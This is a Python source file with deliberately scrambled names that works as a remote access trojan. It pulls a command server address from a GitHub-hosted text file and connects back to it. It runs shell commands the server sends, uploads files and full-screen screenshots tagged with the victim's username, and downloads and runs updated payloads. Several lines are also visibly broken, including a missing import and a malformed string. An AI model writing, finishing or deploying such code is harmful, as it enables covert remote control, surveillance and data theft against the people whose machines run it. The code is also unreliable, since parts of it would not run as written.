import sys,subprocess,socket,time,requests
from PIL import ImageGrab
cUKyogkWvccKabxwJsVKHcl = "04.12.24.4"
mCEnrPpf = ""
umipjAm = ""
OezJWENCpJQiTqgKuUkLkvF = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
ffzQosIoAmbgX = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
cznlNofvRyumwmcQmNKK = "!"
def gpuHRLfzhufjVqqUiLlMC(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s
def zfQYRbjsPYMelvwR(s):
	SOmrNfkR = s.recv(1024)
	if len(SOmrNfkR)==0:
		return True
	BOzgoVlmHlnYSNClYO = SOmrNfkR.decode("utf-8")
	if not BOzgoVlmHlnYSNClYO.startswith(cznlNofvRyumwmcQmNKK):
		proc = subprocess.run(SOmrNfkR.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return
	mWAEYBLLBPCVDwYL = BOzgoVlmHlnYSNClYO.split(" ")[0][1:]
	if mWAEYBLLBPCVDwYL == "download":
		TtnymsPzYGj(s, BOzgoVlmHlnYSNClYO)
	elif mWAEYBLLBPCVDwYL == "screenshot":
		cRotqHtTxZdSpLyfZasl(s)
	elif mWAEYBLLBPCVDwYL == "ChpjyQPYWi":
		s.send(bytes(cUKyogkWvccKabxwJsVKHcl, "utf-8"))
def TtnymsPzYGj(s, BOzgoVlmHlnYSNClYO):
	uwvWCmitmUxcmmIERWVuxa = BOzgoVlmHlnYSNClYO.replace(cznlNofvRyumwmcQmNKK+"screenshot ", "").split(",")
	results = []
	for f in uwvWCmitmUxcmmIERWVuxa:
		results += PjhdhWutOgpoSfBLESMJmt(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(" ".join(results))
def cRotqHtTxZdSpLyfZasl(BOzgoVlmHlnYSNClYO):
	UeOrkpW = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	UeOrkpW.save(fpath)
	UeOrkpW.close()
	r = PjhdhWutOgpoSfBLESMJmt(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)
def PjhdhWutOgpoSfBLESMJmt(iKcwDvGSI, aROsPMkpRbDbLHd, gVixBFhNiuNECopi=None):
	if not os.path.exists(iKcwDvGSI):
		return "FILE NOT FOUND: "+iKcwDvGSI
	headers = {"user":os.getlogin()}
	if gVixBFhNiuNECopi is not None:
		headers = {**headers, **gVixBFhNiuNECopi}
	requests.post(mCEnrPpf+":"+umipjAm+"/"+aROsPMkpRbDbLHd,
		files={open(iKcwDvGSI, "rb")},
		headers=headers)
	return "SUCCESS"
def iNgvDZhpauzEnYAXN():
	if mCEnrPpf == "" or umipjAm == "":
		SOmrNfkR = requests.get(OezJWENCpJQiTqgKuUkLkvF).text.replace("\n","").split(":")
		mCEnrPpf = SOmrNfkR[0].strip()
		umipjAm = SOmrNfkR[1].strip()
		ChpjyQPYWi = SOmrNfkR[2].strip()
	return mCEnrPpf, umipjAm, ChpjyQPYWi
def WZtcJiYZXOH():
	vOCayLwuwDIyZTtRkYWVS = os.path.basename(__file__)
	fileType = vOCayLwuwDIyZTtRkYWVS.split(".")[-1]
	HCPELwnpDwVjcmMLFWJRv = vOCayLwuwDIyZTtRkYWVS.replace(fileType,"") +"."+cUKyogkWvccKabxwJsVKHcl + fileType
	GiBILKvc = os.path.join(os.path.getcwd(), HCPELwnpDwVjcmMLFWJRv)
	with open(HCPELwnpDwVjcmMLFWJRv, "wb+") as f:
		f.write(requests.get(ffzQosIoAmbgX+"/file"+GiBILKvc.split(".")[-1]))
	if fileType == ".exe":
		os.system(".\"+GiBILKvc)
	elif fileType == ".pyw":
		os.system("python "+GiBILKvc")
def LSdJwKK():
	pass
def LmotDrBEIXodE():
	h, p, v = iNgvDZhpauzEnYAXN()
	if cUKyogkWvccKabxwJsVKHcl != v:
		WZtcJiYZXOH()
	LSdJwKK()
	while True:
		try:
			while True:
				KsjPFnmGwD=False
				try:
					s=gpuHRLfzhufjVqqUiLlMC(h, p)
					while not KsjPFnmGwD:
						s.send(b"\n>> ")
						KsjPFnmGwD=zfQYRbjsPYMelvwR(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(LmotDrBEIXodE())
